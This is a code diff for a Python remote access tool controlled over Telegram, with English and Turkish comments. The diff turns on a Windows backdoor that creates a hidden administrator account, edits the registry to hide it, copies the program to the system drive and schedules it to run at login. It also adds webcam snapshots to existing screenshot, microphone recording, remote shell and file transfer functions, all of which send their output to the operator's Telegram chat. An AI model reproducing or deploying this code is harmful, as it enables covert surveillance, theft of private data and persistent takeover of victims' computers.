@@ -15,32 +15,71 @@ from PIL import ImageGrab as sc
 import socket
 import sounddevice as sd
 from scipy.io.wavfile import write
-import pickle
+from shutil import copyfile
+import cv2
 
 nya=0
 rlko=0
-username="ratadmin" #Backdoor username. Arka kapı kullanıcı adımız.
+settings_name="settings.txt"
+username="ratadmin" #Backdoor username. Arka kapı kullanıcı adımız. Değiştirmeyi arka kapıyı /bd komutuyla açmadan yapın. Settings.txt değiştirin burayla birlikte.
 password="ratpassword" #Backdoor password. Arka kapı şifremiz.
-lang="tr" #For english type en. Türkçe için tr yazın.
+lang="tr" #For english type en in settings.txt. Türkçe için settings.txt içine langue karşısına tr yazın.
 xROOT_ACCESS=95454545 #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
 xTOXEN="12341321:DA2doSKDWAD232SD2sDW23S" #Add your own toxen here. Buraya kendi toxeninizi yazın.
-#WARNING: Software reads this from .txt file called degerler so even if you changed here if its wrong there it will not work!
-#UYARI: Yazılım bu değerlerin bazılarını degerler.txt okuyor. Burada doğru bile olsa degerler.txt yanlışsa çalışmaz.
+startup_taskname="RemoteAccessTool"
+fname="EagleEye.jpg"
+#WARNING: Software reads most of the values from .txt file called settings so even if you changed here if its wrong there it will not work!
+#UYARI: Yazılım bu değerlerin çoğunluğunu settings.txt içinden okuyor. Burada doğru bile olsa settings.txt yanlışsa çalışmaz.
 #Buradaki değerler sadece size örnek bir dosya oluşturması için var.
 db_exists=os.path.exists("database.db")
 conn=sqlite3.connect("database.db", check_same_thread=False)
 cur=conn.cursor()
 xdir=os.getcwd()
-startup_path="""C:\RemoteAccessTool.exe"""
+softwarename=os.path.basename(__file__)
+software_rundir=os.path.join(xdir,softwarename)
+try:
+    systemdrive=str(os.getenv('SYSTEMDRIVE'))+"\\"
+except:
+    systemdrive="C:"
+    pass
+startup_path=str(systemdrive)+str(softwarename)#Windows installed drive + Ex name. Windowsun kurulu olduğu disk + programın exe dosyası
 xml_name="RemoteAccessTool.xml" #XML name for schedule task in windows. Windowsta görev zamanlamak için XML dosyası adı.
-xml_path="C:\RemoteAccessTool.xml"
+xml_path=str(systemdrive)+str(xml_name) #Schedule tasks XML file. Görev zamanlamaya yazılacak xml dosyası.
 
 #YAPILACAKLAR
-#XML VE YAZILIM DOSYASINI KENDISINI SISTEM SURUCUSUNUN ICINE KOPYALAMASINI SAĞLA VE YUKARIDAKI GIBI GEREKSIZ ONCEDEN TANIMLANMIŞ YOL KULLANMA.
-#YAZILIMI .exe HALINE GETIR VE GITHUBA YUKLE.
-#/bd (backdoor) tuş menüsüne ekle ve sadece windowsta çalıştığından emin ol.
-#Webcam resim yakalama ekle.
-
+#Programın kendi kendini sistemden silebilmesini sağla.
+#YAZILIMI .exe HALINE GETIR VE GITHUBA YUKLE. (.exe yaparken pprint çıkar.)
+#Ses dosyalarının boyutu çok büyük bir ara bakmak lazım. Yada sürekli ses kayıt modu ekle 2 dk dolunca atsın kayda devam etsin.
+#Başlangıçta düzgün başlamıyor. Düzelt.
+if not db_exists:
+    cur.execute("CREATE TABLE user (id INT, username CHAR(50), firstname VARCHAR(51),lastname CHAR(52))")
+    conn.commit()
+    del cur
+set_exists=os.path.exists(settings_name)
+if not set_exists:
+    cp = c.RawConfigParser()
+    cp.add_section('Settings')
+    cp.set('Settings', 'TOXEN', xTOXEN)
+    cp.set('Settings', 'ROOT_ACCESS', xROOT_ACCESS)
+    cp.set('Settings', 'Langue', lang)
+    cp.set('Settings', 'Username', username)
+    cp.set('Settings', 'Password', password)
+    cp.set('Settings', 'Xml_Name', xml_name)
+    cp.set('Settings', 'Startup_Taskname', startup_taskname)
+    setup = open(settings_name, 'w')
+    cp.write(setup)
+    setup.close()
+#READ SETTINGS FROM -settings.txt. Ayarları settings.txt üzerinden oku.
+nya = c.RawConfigParser()
+nya.read(settings_name)
+TOXEN = nya['Settings'] ['TOXEN']
+ROOT_ACCESS = [int(nya['Settings'] ['ROOT_ACCESS'])] #Burada en dıştaki köşeli parantez listeye çeviriyor bunu yoksa direkt string sanıyor kendini.
+lang = nya['Settings'] ['Langue']
+username = nya['Settings'] ['Username']
+password = nya['Settings'] ['Password']
+xml_name = nya['Settings'] ['Xml_name']
+startup_taskname = nya['Settings'] ['Startup_Taskname']
+bot = telepot.Bot(TOXEN)
 try:
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
@@ -62,9 +101,12 @@ except:
     pass
 try:
     Author=f"{hostname}\{username}"
-except Exception as e:
-    print(e)
+except:
     pass
+def chk_file(filepath):
+    chk= os.path.exists(filepath)
+    if chk:
+        os.remove(filepath)
 def get_sid(insert_username):
     global sid
     try:
@@ -127,8 +169,10 @@ task_scheduler_xml=f"""<?xml version="1.0" encoding="UTF-16"?>
 tr_menu=telepot.namedtuple.ReplyKeyboardMarkup(
     keyboard=[
         [telepot.namedtuple.KeyboardButton(text="/userid"),
-        telepot.namedtuple.KeyboardButton(text="/rec 120")],
+        telepot.namedtuple.KeyboardButton(text="/rec 120"),
+        telepot.namedtuple.KeyboardButton(text="/bd")],
         [telepot.namedtuple.KeyboardButton(text="/ss"),
+        telepot.namedtuple.KeyboardButton(text="/cam"),
         telepot.namedtuple.KeyboardButton(text="/ip"),
         telepot.namedtuple.KeyboardButton(text="/yardim")]
     ],
@@ -137,8 +181,10 @@ tr_menu=telepot.namedtuple.ReplyKeyboardMarkup(
 en_menu=telepot.namedtuple.ReplyKeyboardMarkup(
     keyboard=[
         [telepot.namedtuple.KeyboardButton(text="/userid"),
-        telepot.namedtuple.KeyboardButton(text="/rec 120")],
+        telepot.namedtuple.KeyboardButton(text="/rec 120"),
+        telepot.namedtuple.KeyboardButton(text="/bd")],
         [telepot.namedtuple.KeyboardButton(text="/ss"),
+        telepot.namedtuple.KeyboardButton(text="/cam"),
         telepot.namedtuple.KeyboardButton(text="/ip"),
         telepot.namedtuple.KeyboardButton(text="/help")]
     ],
@@ -146,42 +192,62 @@ en_menu=telepot.namedtuple.ReplyKeyboardMarkup(
 )
 def add_win_backdoor():
     if os.name=="nt":
-        #out1=sp.getoutput(f"""net user /add {username} {password}""")  #Add backdoor user. Arka kapı kullanıcısı ekleyelim.
-        #out2=sp.getoutput(f"""net localgroup administrators {username} /add""") #Grant user to Admin permissions. Admin yetkisi verelim.
-        #out3=sp.getoutput(f"""REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" /f""")  #To hide user. Kullanıcıyı gizlemek için regediti editleyelim.
-        #out4=sp.getoutput(f"""REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f""") #same
-        #out5=sp.getoutput(f"""REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v {username} /t REG_DWORD /d 0 /f""") #Change "/d 0" to "/d 1" if you want account to visible. Hesabın gözükmesini istiyorsanız "/d 0" yu "/d 1" olarak değişin.
-        sid=get_sid(username)
-        xmlfile=open(xml_name,"w") #Open file to write. (for read use "r" for write "w") Dosyayı yazmak için açalım. (okumak için "r" yazmak için "w")
-        xmlfile.write(str(task_scheduler_xml))
-        xmlfile.close()
-        #out7=sp.getoutput(f"""schtasks.exe /create /tn RemoteAccessTool /XML {xml_path} /ru {Author} /rp {password}""") #Add our Sofware to login. Programımızı başlangıça atayalım.
+        try:
+            out1=sp.call(['net', 'user', '/add', username, password])  #Add backdoor user. Arka kapı kullanıcısı ekleyelim.
+            out2=sp.call(['net', 'localgroup', 'administrators', username, '/add']) #Grant user to Admin permissions. Admin yetkisi verelim.
+            out3=sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts', '/f'])#To hide user. Kullanıcıyı gizlemek için regediti editleyelim.
+            out4=sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/f']) #same
+            out5=sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/v', username, '/t', 'REG_DWORD', '/d', '0', '/f']) #Change "/d 0" to "/d 1" if you want account to visible. Hesabın gözükmesini istiyorsanız "/d 0" yu "/d 1" olarak değişin.
+            sid=get_sid(username)
+            xmlfile=open(xml_path,"w") #Open file to write. (for read use "r" for write "w") Dosyayı yazmak için açalım. (okumak için "r" yazmak için "w")
+            xmlfile.write(str(task_scheduler_xml))
+            xmlfile.close()
+            xml_copy=xdir+"\\"+xml_name
+            settings_copy=xdir+"\\"+settings_name
+            if not os.path.exists(systemdrive+xml_name):
+                copyfile(xml_copy, systemdrive)
+            if not os.path.exists(systemdrive+settings_name):
+                copyfile(settings_copy, systemdrive+settings_name)
+            if not os.path.exists(systemdrive+softwarename):
+                copyfile(software_rundir, systemdrive+softwarename)
+            out7=sp.call(['schtasks.exe', '/create', '/tn', startup_taskname, '/XML', xml_path, '/ru', Author, '/rp', password]) #Add our Sofware to login. Programımızı başlangıça atayalım.
+        except Exception as e:
+            globalMessage(e+"add_win_backdoor")
+            pass
     else:
         if lang=="tr":
             globalMessage("Uyarı: Sadece windows işletim sisteminde destekleniyor.\nErişim Reddedildi.")
         else:
             globalMessage("Warning: Backdoor only supported at Windows OS.\nAccess Denied!")
 def remove_win_backdoor():
-    #Add reversing option here.
-    nya="rlko"
-if not db_exists:
-    cur.execute("CREATE TABLE user (id INT, username CHAR(50), firstname VARCHAR(51),lastname CHAR(52))")
-    conn.commit()
-    del cur
-set_exists=os.path.exists("degerler.txt")
-if not set_exists:
-    cp = c.RawConfigParser()
-    cp.add_section('veri')
-    cp.set('veri', 'TOXEN', xTOXEN)
-    cp.set('veri', 'ROOT_ACCESS', xROOT_ACCESS)
-    setup = open('degerler.txt', 'w')
-    cp.write(setup)
-    setup.close()
-nya = c.RawConfigParser()
-nya.read('degerler.txt')
-TOXEN = nya['veri'] ['TOXEN']
-ROOT_ACCESS = [int(nya['veri'] ['ROOT_ACCESS'])] #Burada en dıştaki köşeli parantez listeye çeviriyor bunu yoksa direkt string sanıyor kendini.
-bot=telepot.Bot(TOXEN)
+    if os.name=="nt":
+        try:
+            #Add reversing option here.
+            out1=sp.call(['net','user','/delete', username])
+            out2=sp.call(['REG', 'DELETE', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts', '/f'])
+            out3=sp.call(['schtasks', '/delete', '/tn', startup_taskname,'/f'])
+        except Exception as e:
+            globalMessage(e+"\nremove_win_backdoor")
+def webcam_shot():
+    campath=os.path.join(xdir,fname)
+    chk_file(campath)
+    if os.name=="nt":    
+        try:
+            key=cv2.waitKey(1)
+            webcam=cv2.VideoCapture(0)#, cv2.CAP_DSHOW)
+            check,frame=webcam.read()
+            cv2.imwrite(filename=campath, img=frame)
+            webcam.release()
+        except:
+            webcam.release()
+            pass
+        else:
+            sendFile(campath,True)
+    else:
+        if lang=="tr":
+            globalMessage("Hata: Bu özellik sadece windowsa özeldir.")
+        else:
+            globalMessage("Error:This is only usable in Windows.")
 def access(command): #Access the terminal. Komut satırına erişim.
     global output
     try:
@@ -191,12 +257,13 @@ def access(command): #Access the terminal. Komut satırına erişim.
         globalMessage(e)
         pass
 def eagleye(): #Capture screen photo. Ekran resmini kaydet.
-    global spp
     try:
         ss_name="EagleEye.jpg"
-        spp=os.path.join(xdir,ss_name)
+        ss_path=os.path.join(xdir,ss_name)
+        chk_file(ss_path) #If same file at same path exists lets just delete. Aynı dosya aynı yolda bulunuyorsa silelim.
         ss=sc.grab()
-        ss.save(spp)
+        ss.save(ss_path)
+        sendImg(ss_path)
     except:
         pass
 def batears(battime): #Capture the microphone. Bilgisayarın mikrofonunu kaydet.
@@ -228,7 +295,7 @@ def download(url,filename):
 def handle(msg):
    global userid,chatid
    try:
-    pprint.pprint(msg)
+    #pprint.pprint(msg)
     cur=conn.cursor()
     et="@"
     userid=msg["from"]["id"]
@@ -255,7 +322,7 @@ def handle(msg):
         text="FileID:"+msg["photo"][0]["file_id"]
     else:
         text=msg["text"]
-    global sendFile,globalMessage
+    global sendFile,globalMessage,sendImg
     def globalMessage(msg):
         try:
             msg=str(msg)
@@ -270,10 +337,10 @@ def handle(msg):
         except Exception as e:
             bot.sendMessage(chatid,e)
             pass
-    def sendImg(): #Send screen capture image to telegram. Telegram hesabımıza ekran görüntüsünü yollayalım.
+    def sendImg(spath): #Send screen capture image to telegram. Telegram hesabımıza ekran görüntüsünü yollayalım.
         try:
-            bot.sendPhoto(chatid, photo=open(spp, 'rb'))
-            os.remove(spp) #Delete the file after sent. Yolladıktan sonra dosyayı silelim.
+            bot.sendPhoto(chatid, photo=open(spath, 'rb'))
+            os.remove(spath) #Delete the file after sent. Yolladıktan sonra dosyayı silelim.
         except:
             pass
     if text.startswith("/x ") and userid in ROOT_ACCESS: #Check if user has rights to access our computer via telegram id. Kullanıcının bilgisayarımıza erişimi olup olmadığınız telegram id ile konrol edelim.
@@ -287,9 +354,9 @@ def handle(msg):
             bot.sendMessage(chatid,f"Your User ID is: {userid}\nDo not share this information to anyone.")
     elif text=="/yardim" or text=="/help" or text=="/menu" or text=="/menü":
         if lang=="tr":
-            bot.sendMessage(chatid,"Nyarlko tarafından yazılmıştır.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nKomutlar:\n/x Komut satırına yazacağın komut.\n/ss Ekran alıntısını alır ve sana yollar.\n/d https://indirme.linki dosyadi.exe Dosyayı bilgisayarınıza indirir.\n/ip Ip adresinizi gösterir.\n/userid User ID numaranızı gösterir.\n/rec 1-120 Saniye cinsinden bilgisayara bağlı mikrofon ile kayıt yapar.\nNot: Kayıt yaparken Windows altta mikrofon simgesi çıkarıyor.\n/menu bu menüyü açar.\n/up C:/a.txt dosyasını telegrama yükler.\nDikkat: 50 MB üstü dosyaları yükleyemezsiniz.",reply_markup=tr_menu)
+            bot.sendMessage(chatid,"Nyarlko tarafından yazılmıştır.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nKomutlar:\n/x Komut satırına yazacağın komut.\n/ss Ekran alıntısını alır ve sana yollar.\n/d https://indirme.linki dosyadi.exe Dosyayı bilgisayarınıza indirir.\n/ip Ip adresinizi gösterir.\n/userid User ID numaranızı gösterir.\n/rec 1-120 Saniye cinsinden bilgisayara bağlı mikrofon ile kayıt yapar.\nNot: Kayıt yaparken Windows altta mikrofon simgesi çıkarıyor.\n/menu bu menüyü açar.\n/up C:/a.txt dosyasını telegrama yükler.\nDikkat: 50 MB üstü dosyaları yükleyemezsiniz.\n/bd programı başlangıca atayarak Windowsta arka kapı açar.\n/rbd Windows arka kapısını tamamiyle kaldırır.\n/cam Webcam takılı ise resim çeker.",reply_markup=tr_menu)
         else:
-            bot.sendMessage(chatid,"Written by Nyarlko.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nCommands:\n/x Command you wanna execute.\n/ss screenshot the computer.\n/d https://download.link filename.exe Downloads the file.\n/ip Shows your ip address.\n/userid Will show your User ID number.\n/rec 1-120 (Sec) Will record from computers microphone and send you as wav file.\nWarning: Windows shows microphone icon at taskbar.\n/menu will open this menu.\n/up C:/a.txt uploads a.txt to telegram.\nWarning: You can not upload files bigger than 50 MB.",reply_markup=en_menu)
+            bot.sendMessage(chatid,"Written by Nyarlko.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nCommands:\n/x Command you wanna execute.\n/ss screenshot the computer.\n/d https://download.link filename.exe Downloads the file.\n/ip Shows your ip address.\n/userid Will show your User ID number.\n/rec 1-120 (Sec) Will record from computers microphone and send you as wav file.\nWarning: Windows shows microphone icon at taskbar.\n/menu will open this menu.\n/up C:/a.txt uploads a.txt to telegram.\nWarning: You can not upload files bigger than 50 MB.\n/bd will add backdoor to Windows.\n/rbd will remove backdoor from windows.\n/cam If webcam is connected it will send us picture.",reply_markup=en_menu)
         if userid in ROOT_ACCESS:
             if lang=="tr":
                 bot.sendMessage(chatid,"Admin yetkiniz vardır.")
@@ -350,8 +417,12 @@ def handle(msg):
                 batears(battime)
         except:
             pass
-    elif text.startswith("/bd") and userid in ROOT_ACCESS:
+    elif text.startswith("/cam") and userid in ROOT_ACCESS:
+        webcam_shot()
+    elif text.startswith("/bd") and userid in ROOT_ACCESS: #ADD BACKDOOOR TO WINDOWS. Windowsa arka kapı aç.
         add_win_backdoor()
+    elif text.startswith("/rbd") and userid in ROOT_ACCESS: #REMOVE BACKDOOR FROM WINDOWS. Windows arka kapısını kapa.
+        remove_win_backdoor()
     elif text.startswith("/up ") and userid in ROOT_ACCESS:
         file_dir=text.replace("/up ","")
         try: #Execute. Çalıştır.
